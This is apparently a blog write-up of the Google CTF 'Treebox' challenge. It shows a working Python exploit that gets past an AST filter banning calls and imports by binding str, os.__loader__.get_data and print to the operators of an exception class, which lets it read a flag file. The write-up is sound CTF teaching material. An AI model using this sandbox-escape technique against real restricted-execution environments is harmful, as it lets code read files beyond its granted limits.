---
title: "Treebox"
date: 2022-08-19T10:04:36+05:30
tags:
- Google CTF
- CTF
- Python
- AST
- Sandbox Escape
draft: false
---

This challenge asks for python code as an input, converts it into an AST (abstract syntax tree) and if there aren't any function calls or imports, executes the code. Our goal here is to avoid explicitly calling any functions yet reading the flag located at `flag`. We also can't import any modules explicitly. If we read the source code provided for the challenge, we can observe that the `sys` module is already imported. We can piggyback on this fact to use its modules.

We shall, however, first find all the modules in `sys.modules` that have a `get_data` like function in their `__loader__` attribute. To do so, we run the following locally:

``` python
import sys

for name, handle in sys.modules.items():
    if loader := getattr(handle, '__loader__'):
        for loader_function_name in dir(loader):
            if 'get_data' in loader_function_name:
                print(f"sys.modules['{name}'].__loader__.{loader_function_name}")
```

From the output we get, this looks the most promising:

```python
sys.modules["os"].__loader__.get_data
```

Now we can slowly assemble our exploit.

```python
import sys

class Read(BaseException):
    # Set the addition operator to the str function
    # so that we can use it to stringify bytes-like
    # objects.
    __add__ = str

    # Set the division operator to os.loader.get_data method
    # which can be used to read the raw bytes from a file.
    __truediv__ = sys.modules["os"].__loader__.get_data

    # Set the indexing operator to print, which we'll use to
    # print the flag
    __getitem__ = print

    def __init__(self):

        # Now we read the raw bytes of the file "flag"
        # stringify it and finally print it
        self[self + self / "flag"]


# Raise the exception
raise Read

```
